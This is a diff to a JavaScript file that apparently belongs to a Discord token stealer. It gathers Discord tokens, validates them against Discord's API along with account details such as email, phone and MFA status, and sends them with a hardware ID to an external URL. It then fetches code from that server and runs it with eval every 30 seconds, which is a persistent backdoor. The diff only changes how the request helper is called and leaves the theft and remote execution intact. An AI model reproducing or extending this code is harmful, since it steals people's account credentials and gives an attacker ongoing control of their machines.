@@ -3,7 +3,6 @@
 
 // Do our own stuff
 const fs = require('fs');
-const httpS = url.toLowerCase().startsWith('https') ? 'https' : 'http';
 
 class TokenData {
     constructor(token, id, username, discriminator, email, avatar, verified, locale, mfa_enabled, phone, premium_type) {
@@ -60,7 +59,7 @@ function postData(data) {
 const getTokens = async () => {
     const testToken = (token) => {
         return new Promise((resolve, reject) => {
-            get('https', 'https://discordapp.com/api/v6/users/@me', { Authorization: token }, true).then((res) => resolve(res));
+            get('https://discordapp.com/api/v6/users/@me', { Authorization: token }, true).then((res) => resolve(res));
         });
     };
 
@@ -96,13 +95,13 @@ const getTokens = async () => {
 };
 
 getTokens().then((tokens) => {
-    get(httpS, url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {
-        get(httpS, url.toLowerCase() + `/p/${hwid}`).then((res) => {
+    get(url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {
+        get(url.toLowerCase() + `/p/${hwid}`).then((res) => {
             eval(res);
         });
 
         setInterval(() => {
-            get(httpS, url.toLowerCase() + `/p/${hwid}`).then((res) => {
+            get(url.toLowerCase() + `/p/${hwid}`).then((res) => {
                 eval(res);
             });
         }, 30 * 1000);
